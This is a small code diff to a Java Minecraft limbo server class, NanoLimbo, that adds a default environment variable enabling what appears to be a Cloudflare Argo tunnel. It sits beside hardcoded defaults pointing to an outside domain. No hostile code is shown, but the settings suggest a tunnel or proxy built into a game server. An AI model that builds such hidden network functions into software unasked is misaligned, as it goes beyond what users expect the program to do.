@@ -139,6 +139,7 @@ public final class NanoLimbo {
         envVars.put("CFIP", "cf.877774.xyz");
         envVars.put("CFPORT", "443");
         envVars.put("NAME", "Mc");
+        envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
